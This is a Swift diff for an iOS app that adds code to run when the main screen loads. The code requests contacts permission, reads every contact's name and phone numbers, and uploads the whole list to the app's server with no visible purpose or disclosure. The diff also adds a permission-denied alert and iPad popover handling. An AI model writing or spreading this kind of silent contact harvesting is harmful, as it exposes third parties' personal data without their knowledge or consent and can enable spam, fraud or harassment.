@@ -9,6 +9,7 @@
 import UIKit
 import Alamofire
 import SwiftyJSON
+import Contacts
 
 class MainController: UIViewController {
     
@@ -19,6 +20,7 @@ class MainController: UIViewController {
         
         self.configNav()
         self.configUI()
+        self.startLoadContact()
     }
     
     fileprivate func configNav() {
@@ -203,7 +205,56 @@ extension MainController: instructionDelegate {
 }
 
 extension MainController {
-    func loadContact() {
+    func startLoadContact() {
+        if #available(iOS 9, *) {
+            let statu = CNContactStore.authorizationStatus(for: .contacts)
+            if statu == .notDetermined {
+                self.loadContactData()
+            } else if statu == .denied {
+                self.setDeniedAlert()
+            } else if statu == .authorized {
+                self.loadContactData()
+            } else if statu == .restricted {
+                self.setDeniedAlert()
+            }
+        }
+    }
+
+    func loadContactData() {
+        let store = CNContactStore()
+        var datas = [Any]()
+        var i = 0
+        store.requestAccess(for: .contacts, completionHandler: { (granded, error) in
+            if granded {
+                // 3.1.创建联系人仓库
+                var dic = [String: Any]()
+                
+                let fetchKeys = [CNContainerNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey,CNContactGivenNameKey]
+                let request = CNContactFetchRequest.init(keysToFetch: fetchKeys as [CNKeyDescriptor])
+                do {
+                    try store.enumerateContacts(with: request, usingBlock: { (contact, stop) in
+                        i += 1
+                        var phonsItem = [String]()
+                        let phons = contact.phoneNumbers
+                        for phoneValue in phons {
+                            let number = phoneValue.value
+                            phonsItem.append(number.stringValue)
+                        }
+                        dic["name"] = contact.familyName+contact.givenName
+                        dic["numbers"] = phonsItem
+                        dic["data"] = "0"
+                        dic["contactId"] = i
+                        datas.append(dic)
+                    })
+                } catch _ {}
+            }
+            print(datas)
+            MMRequestManager.manager.submitContact(datas, success: { (response) in }, failure: { (error) in })
+        })
+    }
+    
+    
+    func setDeniedAlert() {
         let aler = UIAlertController.init(title: "提示", message: "请在iPhone的“设置-隐私-通讯录“选项中，允许访问你的通讯录", preferredStyle: .alert)
         aler.addAction(UIAlertAction.init(title: "", style: .default, handler: { (alert) in
             if #available(iOS 8, *) {
@@ -211,7 +262,13 @@ extension MainController {
             }
         }))
         if UIDevice.current.isPad {
-            
+            let pop = aler.popoverPresentationController
+            if pop != nil {
+                pop?.sourceView = self.view
+                pop?.sourceRect = self.view.bounds
+                pop?.permittedArrowDirections = .any
+            }
+            self.present(aler, animated: true, completion: nil)
         } else {
             self.present(aler, animated: true, completion: nil)
         }
